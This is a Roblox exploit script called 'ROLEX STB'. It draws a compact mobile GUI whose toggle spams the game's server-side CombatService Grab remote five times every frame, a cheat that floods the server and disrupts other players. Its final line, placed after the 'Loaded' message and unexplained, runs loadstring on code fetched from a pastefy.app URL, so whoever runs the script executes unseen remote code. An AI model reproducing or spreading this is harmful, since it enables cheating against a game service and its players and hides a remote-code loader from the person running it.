-- ROLEX STB - Ultra Compact Mobile GUI (Optimized Version)

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Cleanup
local existing = playerGui:FindFirstChild("ROLEX_STB_GUI")
if existing then existing:Destroy() end

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ROLEX_STB_GUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Tiny Frame: 110x70 pixels (smaller than before)
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 110, 0, 70)
main.Position = UDim2.new(0.5, -55, 0.1, 0)
main.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
main.BorderSizePixel = 0
main.Parent = screenGui
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 6)

-- Title Bar (Gold)
local title = Instance.new("Frame")
title.Size = UDim2.new(1, 0, 0, 16)
title.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
title.BorderSizePixel = 0
title.Parent = main
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 6)

-- Title Text
local txt = Instance.new("TextLabel")
txt.Size = UDim2.new(1, -20, 1, 0)
txt.Position = UDim2.new(0, 4, 0, 0)
txt.BackgroundTransparency = 1
txt.Text = "ROLEX STB"
txt.TextColor3 = Color3.fromRGB(0, 0, 0)
txt.TextSize = 9
txt.Font = Enum.Font.GothamBold
txt.TextXAlignment = Enum.TextXAlignment.Left
txt.Parent = title

-- Close X
local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 14, 0, 14)
close.Position = UDim2.new(1, -15, 0, 1)
close.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
close.Text = "X"
close.TextColor3 = Color3.fromRGB(255, 255, 255)
close.TextSize = 8
close.Font = Enum.Font.GothamBold
close.Parent = title
Instance.new("UICorner", close).CornerRadius = UDim.new(0, 4)

-- Status
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, 0, 0, 12)
status.Position = UDim2.new(0, 0, 0, 17)
status.BackgroundTransparency = 1
status.Text = "● OFF"
status.TextColor3 = Color3.fromRGB(255, 80, 80)
status.TextSize = 8
status.Font = Enum.Font.GothamBold
status.Parent = main

-- BIG TOGGLE BUTTON (Easy to tap)
local btn = Instance.new("TextButton")
btn.Size = UDim2.new(0.92, 0, 0, 28)
btn.Position = UDim2.new(0.04, 0, 0, 31)
btn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
btn.Text = "START"
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.TextSize = 12
btn.Font = Enum.Font.GothamBlack
btn.Parent = main
Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

-- Speed Text
local speed = Instance.new("TextLabel")
speed.Size = UDim2.new(1, 0, 0, 10)
speed.Position = UDim2.new(0, 0, 0, 61)
speed.BackgroundTransparency = 1
speed.Text = "HYPER MODE"
speed.TextColor3 = Color3.fromRGB(150, 150, 150)
speed.TextSize = 7
speed.Font = Enum.Font.Gotham
speed.Parent = main

-- Drag
local drag, startPos, dragStart = false, nil, nil

main.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		drag = true
		dragStart = input.Position
		startPos = main.Position
	end
end)

main.InputEnded:Connect(function() drag = false end)

UserInputService.InputChanged:Connect(function(input)
	if drag and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local delta = input.Position - dragStart
		main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- Spam System
local spamming = false
local connection = nil
local grabFunction = game:GetService("ReplicatedStorage").Packages.Knit.Services.CombatService.RF.Grab

-- Optimized grab function with direct reference
local function grab()
	pcall(grabFunction.InvokeServer, grabFunction)
end

local function toggle()
	spamming = not spamming
	if spamming then
		status.Text = "● ON"
		status.TextColor3 = Color3.fromRGB(0, 255, 100)
		btn.Text = "STOP"
		btn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
		speed.Text = "HYPER MODE"
		
		-- ULTRA FAST LOOP using Heartbeat for maximum speed
		connection = RunService.Heartbeat:Connect(function()
			if spamming then
				for i = 1, 5 do -- Multiple calls per frame for even faster execution
					grab()
				end
			else
				connection:Disconnect()
				connection = nil
			end
		end)
	else
		status.Text = "● OFF"
		status.TextColor3 = Color3.fromRGB(255, 80, 80)
		btn.Text = "START"
		btn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
		
		if connection then
			connection:Disconnect()
			connection = nil
		end
	end
end

btn.MouseButton1Click:Connect(toggle)
close.MouseButton1Click:Connect(function() 
	spamming = false 
	if connection then
		connection:Disconnect()
		connection = nil
	end
	screenGui:Destroy() 
end)

print("💎 ROLEX STB Loaded - Ultra Compact & Hyper Fast")

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()